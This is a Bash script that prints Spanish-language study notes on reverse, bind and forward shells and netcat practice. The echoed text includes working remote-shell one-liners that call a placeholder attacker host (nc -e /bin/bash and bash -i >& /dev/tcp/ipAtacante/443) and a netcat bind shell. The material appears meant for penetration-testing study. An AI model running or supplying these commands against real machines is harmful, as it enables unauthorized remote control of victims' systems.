#!/bin/bash
clear
echo "###############################################"
echo "# Reverse Shell, Bind Shells y Forward Shells #"
echo "###############################################"
sleep 1.2
echo "
Reverse Shell:
--------------
Definición: Técnica que permite a un atacante conectarse a una máquina remota desde su propia máquina.
Proceso: La máquina victima establece una conexión hacia la máquina del atacante ejecutando un programa malicioso o una instrucción específica.
Control: El atacante toma el control de la máquina remota después de que se establece la conexión de vuelta.

Bind Shell:
-----------
Definición: Técnica opuesta a Reverse Shell, donde el atacante se conecta a la máquina victima.
Proceso: El atacante escucha en un puerto y la máquina victima acepta la conexión entrante en ese puerto.
Control: El atacante accede por consola a la máquina victima, obteniendo así control sobre ella.

Forward Shell:
--------------
Definición: Técnica utilizada cuando no se pueden establecer conexiones Reverse o Bind debido a reglas de Firewall.
Proceso: Se emplea mkfifo para crear un archivo FIFO (named pipe), actuando como una "consola simulada" interactiva.
Control: El atacante redirige el tráfico a través del archivo FIFO, permitiendo la comunicación bidireccional con la máquina remota.

Consideraciones Finales:
------------------------

Es crucial comprender estas técnicas para determinar la mejor opción según el escenario de ataque y las limitaciones de la red. La elección entre Reverse Shell, Bind Shell o Forward Shell dependerá de diversos factores en cada situación."
sleep 4
figlet Reverse Shell
echo ">> nc -nlvp 443"
echo ">> nc -e /bin/bash ipAtacante 443"
echo ">> bash -i >& /dev/tcp/ipAtacante/443(puerto) 0>&1"
echo "Bien, tenemos una maquina atacante (la nuestra) y una IP de la maquina victima. Lo que hacemos con el comand >> nc (netcat) es ponernos en modo de escucha para interceptar en modo interactivo la maquina victima."
sleep 2
figlet Bind Shell
echo "Cual es la diferencia entre Reverse & Bind Shell?"
echo "La diferencia con Bind Shell, es que te conectas con NetCat desde la maquina victima. 
es decir pongo en escucha a la maquina victima con el siguiente:
>> nc -nlvp 4646 -e /bin/bash
entonces desde mi maquina me conecto >> nc IpVictima 4646(puerto)"
sleep 2
figlet Practica NetCat-nc
echo "
Práctica con Netcat:
--------------------

Instalación de Netcat: Asegúrate de tener Netcat instalado en tu máquina. Puedes usarlo tanto en la máquina atacante como en la víctima.
Modo de Escucha (Listener): Práctica con el modo de escucha de Netcat en la máquina del atacante.
>> nc -lvp <puerto>
Conexión Entrante (Bind Shell): Simula una conexión entrante desde la máquina comprometida a la máquina del atacante.
>> nc <máquina del atacante> <puerto>
Conexión Saliente (Reverse Shell): Practica una conexión saliente desde la máquina comprometida a la máquina del atacante>> nc -e /bin/sh <máquina del atacante> <puerto>
Uso de FIFO (Forward Shell): Explora cómo se puede utilizar mkfifo para crear un archivo FIFO y redirigir tráfico"
sleep 4
